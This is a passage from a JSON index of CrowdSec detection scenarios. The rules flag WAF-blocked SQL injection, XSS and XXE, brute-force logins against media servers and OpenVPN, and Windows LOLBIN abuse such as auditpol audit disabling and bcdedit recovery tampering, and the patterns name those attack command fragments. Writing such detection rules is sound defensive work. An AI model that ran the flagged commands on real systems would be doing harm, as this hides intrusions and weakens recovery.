behavior: \"http:exploit\"\n  label: \"Openappsec 'schema validations' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Schema Validation' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-schema-validation.yaml", "version": "0.2", "versions": {"0.1": {"digest": "5db74f61a78169a46c9e57c8d9b29cfff2ae4f5f89b2a0acffa6a54a1bebdf57"}, "0.2": {"digest": "ed81a89e2acacea4ced7ba6461a4449b2c52cce41ea004e8e699f259000c0b95"}}}, "openappsec/openappsec-sql-injection": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-sql-injection\ndescription: \"Detect openappsec 'prevent' securityActions on 'SQL Injection' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'sql injection'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'SQL Injection' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'SQL Injection' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-sql-injection.yaml", "version": "0.2", "versions": {"0.1": {"digest": "1b9c623f1c1a7b7147154264aca614b2aadcdb8fe6d25a1362caee43e5644912"}, "0.2": {"digest": "ef6a4c2887b8080047e8aae572272424d3d7e44ddc9c3dda913d5cbb616e1bec"}}}, "openappsec/openappsec-url-instead-of-file": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-url-instead-of-file\ndescription: \"Detect openappsec 'prevent' securityActions on 'URL instead of file' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'url instead of file'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'url instead of file' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'URL instead of file' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-url-instead-of-file.yaml", "version": "0.2", "versions": {"0.1": {"digest": "370c0b576759dcc3fe7f2fe1809723eb761598c94cc8432cc2781d4691f0b296"}, "0.2": {"digest": "13f6f3de0158e49291738a0c83ab27c48f4d9c97ff9a2c53d97a92fbe0b2c510"}}}, "openappsec/openappsec-xss": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-xss\ndescription: \"Detect openappsec 'prevent' securityActions on 'Cross Site Scripting' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'cross site scripting'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: http\n  classification:\n    - attack.T1189\n    - attack.T1595\n    - attack.T1190\n  spoofable: 0\n  confidence: 2\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'XSS' detection\"\n  remediation: true\n", "description": "Detect openappsec 'prevent' securityActions on 'Cross Site Scripting' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-xss.yaml", "version": "0.2", "versions": {"0.1": {"digest": "43cb006041497512db66ac2dbff9ebe799d524685f5a57e4c0e8721ff4d19de7"}, "0.2": {"digest": "4162af0592925a3de3c136c16e42a1ecc7b94d293867779092a252c371483c8a"}}}, "openappsec/openappsec-xxe": {"content": "type: trigger\n#debug: true\nname: openappsec/openappsec-xxe\ndescription: \"Detect openappsec 'prevent' securityActions on 'XML External Entity' events (when waf blocks malicious request)\"\nfilter: evt.Meta.log_type == 'openappsec_security_log' and Lower(evt.Meta.security_action) in ['prevent', 'detect'] and Lower(evt.Meta.incident_type) contains 'xml external entity'\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1595\n    - attack.T1190\n  behavior: \"http:exploit\"\n  label: \"Openappsec 'XML External Entity' detection\"\n  remediation: true\n  service: http\n", "description": "Detect openappsec 'prevent' securityActions on 'XML External Entity' events (when waf blocks malicious request)", "path": "scenarios/openappsec/openappsec-xxe.yaml", "version": "0.2", "versions": {"0.1": {"digest": "d7d63f2b84a74fa26697fd74d78f9fc187a54ace8b0dc1e1ae28aacf055892a5"}, "0.2": {"digest": "6bcf9558fb7681b4293a7b1d5a705b9f5fd49d2ea6c332354251eba271203195"}}}, "plague-doctor/audiobookshelf-bf": {"content": "# Audiobookshelf bruteforce\ntype: leaky\nname: plague-doctor/audiobookshelf-bf\ndescription: \"Detect Audiobookshelf bruteforce attacks\"\nfilter: \"evt.Meta.service == 'audiobookshelf' && evt.Meta.log_type == 'abs_failed_auth'\"\nleakspeed: 1m\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nreprocess: true\nlabels:\n    service: audiobookshelf\n    type: bruteforce\n    classification:\n        - attack.T1110\n    remediation: true\n    behavior: http:bruteforce\n    spoofable: 0\n    confidence: 3\n", "description": "Detect Audiobookshelf bruteforce attacks", "path": "scenarios/plague-doctor/audiobookshelf-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "08ef8732de86ad3bb63236130482608dd1634b6fc2c28577ea87dd1aed9002b9"}}}, "pserranoa/openvpn-bf": {"content": "# openvpn bruteforce detection / auth_failed\ntype: leaky\nname: pserranoa/openvpn-bf\ndescription: \"Detect openvpn bruteforce\"\nfilter: \"evt.Meta.service == 'openvpn' && evt.Meta.log_type == 'auth_failed'\"\nleakspeed: \"1m\"\nblackhole: 5m\ncapacity: 3\ngroupby: evt.Meta.source_ip\nreprocess: true\nlabels:\n service: openvpn\n remediation: true\n confidence: 3\n spoofable: 0\n classification:\n   - attack.T1110\n label: \"OpenVPN Bruteforce\"\n behaviour: \"generic:bruteforce\"\n", "description": "Detect openvpn bruteforce", "path": "scenarios/pserranoa/openvpn-bf.yml", "version": "0.2", "versions": {"0.1": {"digest": "22a4026f3fd636871afb2c2e7498cfe81be354f77aa9e2a175f299e6a2998952"}, "0.2": {"digest": "52ace71c20c05736950b5f90c4cc4b763d221c52b9b418b954d3fc03604ce9a4"}}}, "schiz0phr3ne/prowlarr-bf": {"content": "# Prowlarr bruteforce\ntype: leaky\nname: schiz0phr3ne/prowlarr-bf\ndescription: \"Detect Prowlarr bruteforce\"\nfilter: \"evt.Meta.log_type in ['prowlarr_failed_authentication']\"\nleakspeed: \"15s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: prowlarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Prowlarr Bruteforce\"\n  remediation: true\n---\n# Prowlarr user enum bruteforce\ntype: leaky\nname: schiz0phr3ne/prowlarr-bf_user-enum\ndescription: \"Detect Prowlarr user enum bruteforce\"\nfilter: \"evt.Meta.log_type in ['prowlarr_failed_authentication']\"\nleakspeed: \"30s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: prowlarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Prowlarr User Enumeration\"\n  remediation: true\n", "description": "Detect Prowlarr bruteforce", "path": "scenarios/schiz0phr3ne/prowlarr-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "feac3b8dda8d9841c36edd56c9e4504d4be3f3cf6027e67c00fb8f2f6b6784ee"}, "0.2": {"digest": "97580733f96cea718dea67b07f9a3f1e27091623f38290c04c2dcbb81d63394d"}}}, "schiz0phr3ne/radarr-bf": {"content": "# Radarr bruteforce\ntype: leaky\nname: schiz0phr3ne/radarr-bf\ndescription: \"Detect Radarr bruteforce\"\nfilter: \"evt.Meta.log_type in ['radarr_failed_authentication']\"\nleakspeed: \"15s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: radarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Radarr Bruteforce\"\n  remediation: true\n---\n# Radarr user enum bruteforce\ntype: leaky\nname: schiz0phr3ne/radarr-bf_user-enum\ndescription: \"Detect Radarr user enum bruteforce\"\nfilter: \"evt.Meta.log_type in ['radarr_failed_authentication']\"\nleakspeed: \"30s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: radarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Radarr User Enumeration\"\n  remediation: true\n", "description": "Detect Radarr bruteforce", "path": "scenarios/schiz0phr3ne/radarr-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "e4917c28697b2e60f6324f0daa7c844154a852ba7db95080575fb428a1596786"}, "0.2": {"digest": "00abe1e708f2f2f19ad43a44f004fb6f2f0b6c46238196412545a2e17d32a1b8"}}}, "schiz0phr3ne/sonarr-bf": {"content": "# Sonarr bruteforce\ntype: leaky\nname: schiz0phr3ne/sonarr-bf\ndescription: \"Detect Sonarr bruteforce\"\nfilter: \"evt.Meta.log_type in ['sonarr_failed_authentication']\"\nleakspeed: \"15s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: sonarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Sonarr Bruteforce\"\n  remediation: true\n---\n# Sonarr user enum bruteforce\ntype: leaky\nname: schiz0phr3ne/sonarr-bf_user-enum\ndescription: \"Detect Sonarr user enum bruteforce\"\nfilter: \"evt.Meta.log_type in ['sonarr_failed_authentication']\"\nleakspeed: \"30s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\nblackhole: 1m\nreprocess: true\nlabels:\n  service: sonarr\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Sonarr User Enumeration\"\n  remediation: true\n", "description": "Detect Sonarr bruteforce", "path": "scenarios/schiz0phr3ne/sonarr-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "110d81a708fdb4d201495e61619d2d36acb24d8e8b8a6e55e2210517618aaff1"}, "0.2": {"digest": "0bbff63af5b5b9c8179c29111f500b068a45787e519a4c497a7bd10b397f5ea2"}}}, "sdwilsh/navidrome-bf": {"content": "---\nblackhole: 1m\ncapacity: 5\ndescription: A scenario that detects excessive login attempts per unique IP\nfilter: evt.Meta.log_type == 'navidrome_failed_auth'\ngroupby: evt.Meta.source_ip\nlabels:\n  behavior: generic:bruteforce\n  classification:\n    - attack.T1110\n  confidence: 3\n  cti: true\n  label: Navidrome Login Bruteforce\n  remediation: true\n  service: navidrome\n  spoofable: 0\n  type: bruteforce\nleakspeed: 20s\nname: sdwilsh/navidrome-bf\ntype: leaky\n", "description": "A scenario that detects excessive login attempts per unique IP", "path": "scenarios/sdwilsh/navidrome-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "ed740fbf97849a6d84e1b9bcae283973bde3293486a0517848680f98bc09b04f"}, "0.2": {"digest": "728396f8ef1251ffe9745346c10ee7f23fd7b21aeeda0d16959a790044d94095"}}}, "sigmahq/proc_creation_win_addinutil_suspicious_cmdline": {"content": "type: trigger\nname: sigmahq/proc_creation_win_addinutil_suspicious_cmdline\ndescription: |\n  Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\addinutil.exe' || evt.Parsed.OriginalFileName == 'AddInUtil.exe') && ((evt.Parsed.CommandLine contains '-AddInRoot:' || evt.Parsed.CommandLine contains '-PipelineRoot:') && (evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\Desktop\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\') || (evt.Parsed.CommandLine contains '-AddInRoot:.' || evt.Parsed.CommandLine contains '-AddInRoot:\".\"' || evt.Parsed.CommandLine contains '-PipelineRoot:.' || evt.Parsed.CommandLine contains '-PipelineRoot:\".\"') && (evt.Parsed.CurrentDirectory contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CurrentDirectory contains '\\\\Desktop\\\\' || evt.Parsed.CurrentDirectory contains '\\\\Downloads\\\\' || evt.Parsed.CurrentDirectory contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CurrentDirectory contains '\\\\Windows\\\\Temp\\\\')))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Suspicious AddinUtil.EXE CommandLine Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload. \n", "path": "scenarios/sigmahq/proc_creation_win_addinutil_suspicious_cmdline.yml", "version": "0.2", "versions": {"0.1": {"digest": "3a756fc466e6a30b34ea2e90d18a95a6de5072ae0d7d0c52d7ee025705213704"}, "0.2": {"digest": "bfc8b6a8f34426068befa5887e8fd404672010dc2a82bde4c91a3a1488ce188c"}}}, "sigmahq/proc_creation_win_adplus_memory_dump": {"content": "type: trigger\nname: sigmahq/proc_creation_win_adplus_memory_dump\ndescription: |\n  Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\adplus.exe' || evt.Parsed.OriginalFileName == 'Adplus.exe') && (evt.Parsed.CommandLine contains ' -hang ' || evt.Parsed.CommandLine contains ' -pn ' || evt.Parsed.CommandLine contains ' -pmn ' || evt.Parsed.CommandLine contains ' -p ' || evt.Parsed.CommandLine contains ' -po ' || evt.Parsed.CommandLine contains ' -c ' || evt.Parsed.CommandLine contains ' -sc '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"Potential Adplus.EXE Abuse\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"AdPlus.exe\", a binary that is part of the Windows SDK that can be used as a LOLBIN in order to dump process memory and execute arbitrary commands.\n", "path": "scenarios/sigmahq/proc_creation_win_adplus_memory_dump.yml", "version": "0.2", "versions": {"0.1": {"digest": "d05a0f375eadd1fcbe1b6d9a20a531de82d0c795a261ed9a3d9a50036973dfe7"}, "0.2": {"digest": "45805c16bac992f90ec8a074b5df366092624a2868c5cb20988a17202699dc8e"}}}, "sigmahq/proc_creation_win_agentexecutor_susp_usage": {"content": "type: trigger\nname: sigmahq/proc_creation_win_agentexecutor_susp_usage\ndescription: |\n  Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\AgentExecutor.exe' || evt.Parsed.OriginalFileName == 'AgentExecutor.exe') && (evt.Parsed.CommandLine contains ' -powershell' || evt.Parsed.CommandLine contains ' -remediationScript') && not (evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\' || evt.Parsed.CommandLine contains 'C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\' || evt.Parsed.ParentImage endsWith '\\\\Microsoft.Management.Services.IntuneWindowsAgent.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Suspicious AgentExecutor PowerShell Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the AgentExecutor.exe binary. Which can be abused as a LOLBIN to execute powershell scripts with the ExecutionPolicy \"Bypass\" or any binary named \"powershell.exe\" located in the path provided by 6th positional argument\n", "path": "scenarios/sigmahq/proc_creation_win_agentexecutor_susp_usage.yml", "version": "0.2", "versions": {"0.1": {"digest": "f83e0c595ea28e785265b04047083bb33d70851812602bc796d809aa05758cc6"}, "0.2": {"digest": "5697e756b6fdffe276947d038477365163ecaeb4b170fc08b37b8c31aee680ca"}}}, "sigmahq/proc_creation_win_aspnet_compiler_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_aspnet_compiler_susp_child_process\ndescription: |\n  Detects potentially suspicious child processes of \"aspnet_compiler.exe\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\aspnet_compiler.exe' && (evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image contains '\\\\Users\\\\Public\\\\' || evt.Parsed.Image contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.Image contains '\\\\AppData\\\\Local\\\\Roaming\\\\' || evt.Parsed.Image contains ':\\\\Temp\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Tasks\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1127\n\n  label: \"Suspicious Child Process of AspNetCompiler\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potentially suspicious child processes of \"aspnet_compiler.exe\".\n", "path": "scenarios/sigmahq/proc_creation_win_aspnet_compiler_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "829f6435b4c034447f4b5008d2f18e9a57faa15d937774acfb3b4dfefdc81db6"}, "0.2": {"digest": "23305e8a898b8fa971e78a38d2fbf79c8d828358d57ce6135aca1af9a1e4fb94"}}}, "sigmahq/proc_creation_win_aspnet_compiler_susp_paths": {"content": "type: trigger\nname: sigmahq/proc_creation_win_aspnet_compiler_susp_paths\ndescription: |\n  Detects execution of \"aspnet_compiler.exe\" with potentially suspicious paths for compilation.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\' || evt.Parsed.Image contains 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\') && evt.Parsed.Image endsWith '\\\\aspnet_compiler.exe' && (evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Temp\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\Roaming\\\\' || evt.Parsed.CommandLine contains ':\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Temp\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.CommandLine contains ':\\\\Windows\\\\Tasks\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1127\n\n  label: \"Potentially Suspicious ASP.NET Compilation Via AspNetCompiler\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of \"aspnet_compiler.exe\" with potentially suspicious paths for compilation.\n", "path": "scenarios/sigmahq/proc_creation_win_aspnet_compiler_susp_paths.yml", "version": "0.2", "versions": {"0.1": {"digest": "cf6a31110bbd06355e6cb2a9ccfb489f838367cf9cfa23915d2ac53c6dc38e54"}, "0.2": {"digest": "c10d8e7a5aef20b6ebba31b5428b5c00e334538f8961704b2909ae8f3aa35856"}}}, "sigmahq/proc_creation_win_at_interactive_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_at_interactive_execution\ndescription: |\n  Detects an interactive AT job, which may be used as a form of privilege escalation.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\at.exe' && evt.Parsed.CommandLine contains 'interactive')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1053.002\n\n  label: \"Interactive AT Job\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects an interactive AT job, which may be used as a form of privilege escalation.\n", "path": "scenarios/sigmahq/proc_creation_win_at_interactive_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "7cfdf5d1e90cdf0a6f7673b45bf85bda753447f438554fcf900a51032053a399"}, "0.2": {"digest": "925f4ce23412cbeb2d6c959a84e62e8c99a2008d307ff27fdd808c17a18ecc01"}}}, "sigmahq/proc_creation_win_attrib_system_susp_paths": {"content": "type: trigger\nname: sigmahq/proc_creation_win_attrib_system_susp_paths\ndescription: |\n  Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\attrib.exe' || evt.Parsed.OriginalFileName == 'ATTRIB.EXE') && evt.Parsed.CommandLine contains ' +s' && (evt.Parsed.CommandLine contains ' %' || evt.Parsed.CommandLine contains '\\\\Users\\\\Public\\\\' || evt.Parsed.CommandLine contains '\\\\AppData\\\\Local\\\\' || evt.Parsed.CommandLine contains '\\\\ProgramData\\\\' || evt.Parsed.CommandLine contains '\\\\Downloads\\\\' || evt.Parsed.CommandLine contains '\\\\Windows\\\\Temp\\\\') && (evt.Parsed.CommandLine contains '.bat' || evt.Parsed.CommandLine contains '.dll' || evt.Parsed.CommandLine contains '.exe' || evt.Parsed.CommandLine contains '.hta' || evt.Parsed.CommandLine contains '.ps1' || evt.Parsed.CommandLine contains '.vbe' || evt.Parsed.CommandLine contains '.vbs') && not (evt.Parsed.CommandLine contains '\\\\Windows\\\\TEMP\\\\' && evt.Parsed.CommandLine contains '.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1564.001\n\n  label: \"Set Suspicious Files as System Files Using Attrib.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs \n", "path": "scenarios/sigmahq/proc_creation_win_attrib_system_susp_paths.yml", "version": "0.2", "versions": {"0.1": {"digest": "5c11a0eb14b2dd74da8842f50aec989587b83fbd9891020151a909f0593be5d3"}, "0.2": {"digest": "d3a25562bdab9de882dd091cfb76b8e73f4cc59bb60a5c6ac1ae742c1980e22b"}}}, "sigmahq/proc_creation_win_auditpol_nt_resource_kit_usage": {"content": "type: trigger\nname: sigmahq/proc_creation_win_auditpol_nt_resource_kit_usage\ndescription: |\n  Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '/logon:none' || evt.Parsed.CommandLine contains '/system:none' || evt.Parsed.CommandLine contains '/sam:none' || evt.Parsed.CommandLine contains '/privilege:none' || evt.Parsed.CommandLine contains '/object:none' || evt.Parsed.CommandLine contains '/process:none' || evt.Parsed.CommandLine contains '/policy:none')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.002\n\n  label: \"Audit Policy Tampering Via NT Resource Kit Auditpol\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. \n", "path": "scenarios/sigmahq/proc_creation_win_auditpol_nt_resource_kit_usage.yml", "version": "0.2", "versions": {"0.1": {"digest": "65e6c26e831cee92b9c54d15ef9f21eed28e52395bc3f192d563779871f1ce2b"}, "0.2": {"digest": "4e1eb8864a57046347588b51b81955958dc1303a298780c90512c64e1afbcda4"}}}, "sigmahq/proc_creation_win_auditpol_susp_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_auditpol_susp_execution\ndescription: |\n  Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\auditpol.exe' || evt.Parsed.OriginalFileName == 'AUDITPOL.EXE') && (evt.Parsed.CommandLine contains 'disable' || evt.Parsed.CommandLine contains 'clear' || evt.Parsed.CommandLine contains 'remove' || evt.Parsed.CommandLine contains 'restore'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.002\n\n  label: \"Audit Policy Tampering Via Auditpol\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor. \n", "path": "scenarios/sigmahq/proc_creation_win_auditpol_susp_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "0adb89b595bf1fca08d5201d16ba768593886bee2065315db82c4cf8ad6ba559"}, "0.2": {"digest": "00b8d975bd6fee4872bc8e7f7cbff2e9bc0fe89b0302071cfaeb566aa33fc3f2"}}}, "sigmahq/proc_creation_win_bcdedit_boot_conf_tamper": {"content": "type: trigger\nname: sigmahq/proc_creation_win_bcdedit_boot_conf_tamper\ndescription: |\n  Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\bcdedit.exe' || evt.Parsed.OriginalFileName == 'bcdedit.exe') && evt.Parsed.CommandLine contains 'set' && (evt.Parsed.CommandLine contains 'bootstatuspolicy' && evt.Parsed.CommandLine contains 'ignoreallfailures' || evt.Parsed.CommandLine contains 'recoveryenabled' && evt.Parsed.CommandLine contains 'no'))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1490\n\n  label: \"Boot Configuration Tampering Via Bcdedit.EXE\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware.\n", "path": "scenarios/sigmahq/proc_creation_win_bcdedit_boot_conf_tamper.yml", "version": "0.2", "versions": {"0.1": {"digest": "2d4b390ffe10570a56516492197c5c9834c8afe3cfa072d086bc1b03434f1368"}, "0.2": {"digest": "d04b43cea7c8746ff6994ccbbf9dec2dff93b2fb594eb26a5ec326613e781726"}}}, "sigmahq/proc_creation_win_bginfo_suspicious_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_bginfo_suspicious_child_process\ndescription: |\n  Detects suspicious child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\bginfo.exe' || evt.Parsed.ParentImage endsWith '\\\\bginfo64.exe') && (evt.Parsed.Image endsWith '\\\\calc.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith 